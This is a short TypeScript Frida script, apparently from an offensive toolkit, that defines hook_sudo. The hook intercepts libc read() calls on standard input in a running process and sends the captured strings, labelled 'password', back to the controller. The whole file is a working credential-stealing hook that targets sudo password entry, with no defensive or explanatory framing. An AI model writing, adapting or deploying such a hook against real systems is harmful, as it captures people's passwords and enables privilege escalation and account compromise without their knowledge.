import cfunc from './func.c.js'

export function hook_sudo(): void {
    var cm = new CModule(cfunc);
    Process.enumerateModules().forEach((lib) => {
        if (lib.name.startsWith("libc.so")) {
            Interceptor.attach(lib.getExportByName('read'), {
                onEnter: function (args) {
                    // Save these args
                    this.fd  = args[0].toInt32();
                    this.buf = args[1];
                    this.len = args[2].toInt32();
                    return
                },
                onLeave: function (retval) {
                    if (this.fd == 0) {
                        try {
                            // Erroring when declared up above with an access violation so i guess we will just do it here
                            var readline = new NativeFunction(cm.readline, 'int', ['pointer', 'int']);
                            var str = this.buf.readUtf8String(readline(ptr(this.buf), this.len))
                            if (str.length > 0) {
                                send({type:"password", val: str})
                            }
                        } catch (e) {
                        }
                    }
                },
            });
        }
    })
}